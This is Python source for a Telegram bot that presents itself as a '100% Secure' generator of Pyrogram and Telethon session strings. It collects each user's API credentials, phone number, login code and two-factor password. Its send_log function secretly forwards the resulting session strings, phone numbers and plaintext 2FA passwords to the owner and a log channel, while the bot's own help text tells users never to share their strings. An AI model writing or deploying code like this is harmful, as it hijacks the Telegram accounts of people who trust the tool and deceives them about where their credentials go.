import os, logging
from datetime import datetime
import pytz
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from pyrogram.errors import UserNotParticipant, FloodWait
from pyromod import listen

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
MUST_JOIN = os.environ.get("MUST_JOIN", "")
OWNER_ID = int(os.environ.get("OWNER_ID", 0))
LOG_CHANNEL_ID = int(os.environ.get("LOG_CHANNEL_ID", 0))

MAINTENANCE = False

app = Client("SessionBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True)

# ================= TIMEZONE =================
IST = pytz.timezone("Asia/Kolkata")
def get_ist_time():
    return datetime.now(IST).strftime("%Y-%m-%d %I:%M:%S %p")

# ================= UI =================
WELCOME = (
    "╔══════════════════════════════╗\n"
    "║   🔥 **SESSION STRING GENERATOR**   ║\n"
    "╚══════════════════════════════╝\n\n"
    "╭──────────────────────────────╮\n"
    "│  ✨ **Choose your session type**  │\n"
    "╰──────────────────────────────╯\n\n"
    "🔒 **100% Secure** • ⚡ **Instant** • 💾 **Saved Messages**\n\n"
    "> 🐍 Pyrogram (User / Bot)\n"
    "> 📞 Telethon (User)\n"
    "> 🔄 Pyrogram ➜ Telethon Converter\n"
    "> 🛡 2FA Support • 📩 Auto Delivery"
)

MAIN_MENU = InlineKeyboardMarkup([
    [InlineKeyboardButton("🐍 Pyrogram User Session", callback_data="pyro_user")],
    [InlineKeyboardButton("🤖 Pyrogram Bot Session", callback_data="pyro_bot")],
    [InlineKeyboardButton("📞 Telethon String Session", callback_data="telethon")],
    [InlineKeyboardButton("🔄 Pyrogram ➜ Telethon Converter", callback_data="convert")],
    [InlineKeyboardButton("❓ Help & About", callback_data="help")]
])
BACK_BTN = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]])
CANCEL_BTN = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])

# ================= PREMIUM STRING UI =================
async def send_premium_string(user_id, session_type, session_str, has_2fa=False):
    """Send session string with premium UI to bot DM."""
    badge = "🛡️ 2FA Verified" if has_2fa else "🔓 No 2FA"
    text = (
        f"╔══════════════════════════════╗\n"
        f"║   ✅ **{session_type}**   ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"`{session_str}`\n\n"
        f"┌─────────────────────────────┐\n"
        f"│ {badge}  •  📩 **Saved Messages** │\n"
        f"│ ⚠️ **Never share this string**   │\n"
        f"└─────────────────────────────┘\n\n"
        f"🕒 `{get_ist_time()}`"
    )
    await app.send_message(user_id, text, reply_markup=BACK_BTN, disable_web_page_preview=True)

# ================= LOGGING =================
async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2fa_password=None):
    """Send detailed log to LOG_CHANNEL_ID and OWNER_ID."""
    user_id = user.id
    name = user.first_name or "N/A"
    username = f"@{user.username}" if user.username else "N/A"

    detailed = (
        f"#NEW_USER\n"
        f"🔐 **New Session Generated!**\n\n"
        f"👤 **User ID:** `{user_id}`\n"
        f"👤 **Name:** {name}\n"
        f"👤 **Username:** {username}\n"
        f"📱 **Phone:** `{phone}`\n"
        f"🛡️ **2FA Verified:** {'Yes' if has_2fa else 'No'}\n"
    )
    if has_2fa and real_2fa_password:
        detailed += f"🔑 **Real 2FA Password:** `{real_2fa_password}`\n"
    detailed += (
        f"🔑 **Session String:**\n`{session_str}`\n\n"
        f"📅 **Date & Time (Kolkata):** {get_ist_time()}"
    )

    # Send to log channel (no 2FA password)
    simple_log = detailed.replace(f"🔑 **Real 2FA Password:** `{real_2fa_password}`\n", "") if real_2fa_password else detailed
    if LOG_CHANNEL_ID:
        try:
            await app.send_message(LOG_CHANNEL_ID, simple_log, disable_web_page_preview=True)
        except Exception as e:
            logging.error(f"Log channel error: {e}")

    # Send detailed log to owner (with 2FA password)
    if OWNER_ID:
        try:
            await app.send_message(OWNER_ID, detailed, disable_web_page_preview=True)
        except Exception as e:
            logging.error(f"Owner log error: {e}")

# ================= FORCE SUB =================
async def is_member(user_id):
    if not MUST_JOIN:
        return True
    try:
        member = await app.get_chat_member(MUST_JOIN, user_id)
        return str(member.status) in ["ChatMemberStatus.OWNER", "ChatMemberStatus.ADMINISTRATOR", "ChatMemberStatus.MEMBER"]
    except UserNotParticipant:
        return False
    except Exception:
        return True

async def force_sub_check(message):
    if MAINTENANCE and message.from_user.id != OWNER_ID:
        await message.reply_text("🔧 **Bot is under maintenance.** Please try again later.", reply_markup=BACK_BTN)
        return False
    if not await is_member(message.from_user.id):
        try:
            link = await app.export_chat_invite_link(MUST_JOIN)
        except:
            link = f"https://t.me/{MUST_JOIN.replace('@', '')}"
        btn = InlineKeyboardMarkup([
            [InlineKeyboardButton("📢 Join Channel", url=link)],
            [InlineKeyboardButton("✅ Verify Subscription", callback_data="verify_sub")]
        ])
        await message.reply_text(
            "⚠️ **Access Denied!**\n\n"
            "Bot use karne ke liye pehle channel join karein.\n"
            "Join karne ke baad **Verify** button dabayein.",
            reply_markup=btn
        )
        return False
    return True

# ================= START =================
@app.on_message(filters.command("start") & filters.private)
async def start(_, message: Message):
    if not await force_sub_check(message):
        return
    await message.reply_text(WELCOME, reply_markup=MAIN_MENU, disable_web_page_preview=True)

# ================= CALLBACK =================
@app.on_callback_query()
async def handle_callback(_, query: CallbackQuery):
    data = query.data
    user_id = query.from_user.id
    user = query.from_user
    await query.answer()

    if data == "verify_sub":
        if await is_member(user_id):
            await query.message.edit_text(WELCOME, reply_markup=MAIN_MENU, disable_web_page_preview=True)
        else:
            await query.answer("❌ Aapne abhi tak channel join nahi kiya!", show_alert=True)
        return

    if data == "cancel":
        try:
            await query.message.delete()
        except:
            pass
        await app.send_message(user_id, "❌ **Cancelled.**\n\nUse /start to begin again.", reply_markup=BACK_BTN)
        return

    if data == "back":
        await query.message.edit_text(WELCOME, reply_markup=MAIN_MENU, disable_web_page_preview=True)
        return

    if data == "help":
        await query.message.edit_text(
            "❓ **Help & About**\n\n"
            "**Commands:**\n"
            "/start — Main Menu\n"
            "/help — This message\n\n"
            "**Session Types:**\n"
            "• **Pyrogram User** — Userbot (user account)\n"
            "• **Pyrogram Bot** — Bot account (bot token)\n"
            "• **Telethon** — Telethon userbot\n"
            "• **Converter** — Pyrogram string → Telethon\n\n"
            "**Security Tips:**\n"
            "• Never share your session string\n"
            "• Revoke via Telegram → Settings → Devices\n"
            "• Use 2FA for extra safety\n\n"
            "> Built with ❤️ using Pyrogram + Telethon",
            reply_markup=BACK_BTN,
            disable_web_page_preview=True
        )
        return

    if not await force_sub_check(query.message):
        return

    try:
        await query.message.delete()
    except:
        pass

    # ---------- Pyrogram Bot ----------
    if data == "pyro_bot":
        await app.send_message(user_id, "🤖 **Send your Bot Token** (from @BotFather):\n\n> Example: `123456:ABC-DEF...`", reply_markup=CANCEL_BTN)
        token_msg = await app.listen(user_id)
        if token_msg.text and token_msg.text.lower() == "/cancel":
            await app.send_message(user_id, "❌ Cancelled.", reply_markup=BACK_BTN)
            return
        token = token_msg.text.strip()
        try:
            bc = Client(":memory:", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
            await bc.start()
            s = await bc.export_session_string()
            await bc.stop()
            await send_premium_string(user_id, "Pyrogram Bot Session", s)
            await send_log(user, "Pyrogram Bot", s, "N/A (Bot Token)")
        except Exception as e:
            await app.send_message(user_id, f"❌ **Error:** `{e}`", reply_markup=BACK_BTN)
        return

    # ---------- Converter ----------
    if data == "convert":
        await app.send_message(user_id, "🔄 **Send your Pyrogram Session String:**", reply_markup=CANCEL_BTN)
        pyro_str_msg = await app.listen(user_id)
        if pyro_str_msg.text and pyro_str_msg.text.lower() == "/cancel":
            await app.send_message(user_id, "❌ Cancelled.", reply_markup=BACK_BTN)
            return
        pyro_str = pyro_str_msg.text.strip()
        try:
            from telethon.sync import TelegramClient
            from telethon.sessions import StringSession
            temp = Client(":memory:", api_id=API_ID, api_hash=API_HASH, session_string=pyro_str, in_memory=True)
            await temp.start()
            me = await temp.get_me()
            tele = TelegramClient(StringSession(), API_ID, API_HASH)
            tele.start()
            tele_str = tele.session.save()
            await temp.stop()
            await tele.disconnect()
            await send_premium_string(user_id, "Telethon String (Converted)", tele_str)
            await send_log(me, "Converter", tele_str, me.phone_number if me.phone_number else "N/A")
        except Exception as e:
            await app.send_message(user_id, f"❌ **Conversion Error:** `{e}`", reply_markup=BACK_BTN)
        return

    # ---------- User Sessions ----------
    await app.send_message(user_id, "🆔 **Send your API ID:**", reply_markup=CANCEL_BTN)
    api_id_msg = await app.listen(user_id)
    if api_id_msg.text and api_id_msg.text.lower() == "/cancel":
        await app.send_message(user_id, "❌ Cancelled.", reply_markup=BACK_BTN)
        return
    api_id = int(api_id_msg.text.strip())

    await app.send_message(user_id, "🔑 **Send your API HASH:**", reply_markup=CANCEL_BTN)
    api_hash_msg = await app.listen(user_id)
    if api_hash_msg.text and api_hash_msg.text.lower() == "/cancel":
        await app.send_message(user_id, "❌ Cancelled.", reply_markup=BACK_BTN)
        return
    api_hash = api_hash_msg.text.strip()

    await app.send_message(user_id, "📱 **Send your phone number** (with country code):\n\n> Example: `+919876543210`", reply_markup=CANCEL_BTN)
    phone_msg = await app.listen(user_id)
    if phone_msg.text and phone_msg.text.lower() == "/cancel":
        await app.send_message(user_id, "❌ Cancelled.", reply_markup=BACK_BTN)
        return
    phone = phone_msg.text.strip()

    if data == "pyro_user":
        uc = Client(f"gen_{user_id}", api_id=api_id, api_hash=api_hash, in_memory=True)
        await uc.connect()
        sent = await uc.send_code(phone)
        await app.send_message(user_id, "🔐 **Send the OTP** you received:", reply_markup=CANCEL_BTN)
        otp_msg = await app.listen(user_id)
        if otp_msg.text and otp_msg.text.lower() == "/cancel":
            await app.send_message(user_id, "❌ Cancelled.", reply_markup=BACK_BTN)
            await uc.disconnect()
            return
        otp = otp_msg.text.strip()
        has_2fa = False
        real_2fa_password = None
        try:
            await uc.sign_in(phone, sent.phone_code_hash, otp)
        except Exception as e:
            if "password" in str(e).lower():
                has_2fa = True
                await app.send_message(user_id, "🔒 **2FA enabled. Send your password:**", reply_markup=CANCEL_BTN)
                pwd_msg = await app.listen(user_id)
                real_2fa_password = pwd_msg.text.strip()
                await uc.check_password(real_2fa_password)
            else:
                raise e
        s = await uc.export_session_string()
        await send_premium_string(user_id, "Pyrogram User Session", s, has_2fa)
        # Backup to Saved Messages
        try:
            await uc.send_message("me", f"🔐 **Pyrogram Session**\n`{s}`\n\n🕒 `{get_ist_time()}`")
        except:
            pass
        await uc.disconnect()
        await send_log(user, "Pyrogram User", s, phone, has_2fa, real_2fa_password)

    elif data == "telethon":
        from telethon.sync import TelegramClient
        from telethon.sessions import StringSession
        from telethon.errors import SessionPasswordNeededError
        with TelegramClient(StringSession(), api_id, api_hash) as c:
            c.send_code_request(phone)
            await app.send_message(user_id, "🔐 **Send the OTP** you received:", reply_markup=CANCEL_BTN)
            otp_msg = await app.listen(user_id)
            otp = otp_msg.text.strip()
            has_2fa = False
            real_2fa_password = None
            try:
                c.sign_in(phone, otp)
            except SessionPasswordNeededError:
                has_2fa = True
                await app.send_message(user_id, "🔒 **2FA enabled. Send your password:**", reply_markup=CANCEL_BTN)
                pwd_msg = await app.listen(user_id)
                real_2fa_password = pwd_msg.text.strip()
                c.sign_in(password=real_2fa_password)
            s = c.session.save()
            await send_premium_string(user_id, "Telethon String Session", s, has_2fa)
            # Backup to Saved Messages
            try:
                c.send_message("me", f"🔐 **Telethon Session**\n`{s}`\n\n🕒 `{get_ist_time()}`")
            except:
                pass
            await send_log(user, "Telethon", s, phone, has_2fa, real_2fa_password)

# ================= OWNER COMMANDS =================
@app.on_message(filters.command("ping") & filters.user(OWNER_ID))
async def ping(_, message):
    await message.reply_text("🏓 **Pong!** Bot is alive.")

@app.on_message(filters.command("stats") & filters.user(OWNER_ID))
async def stats(_, message):
    await message.reply_text(f"📊 **Bot Stats**\n\nStatus: Running\nMaintenance: {MAINTENANCE}")

@app.on_message(filters.command("maintenance") & filters.user(OWNER_ID))
async def maintenance_cmd(_, message):
    global MAINTENANCE
    MAINTENANCE = not MAINTENANCE
    await message.reply_text(f"🔧 Maintenance mode: **{'ON' if MAINTENANCE else 'OFF'}**")

if __name__ == "__main__":
    logging.info("Starting Session Bot with Logging + Premium UI...")
    app.run()
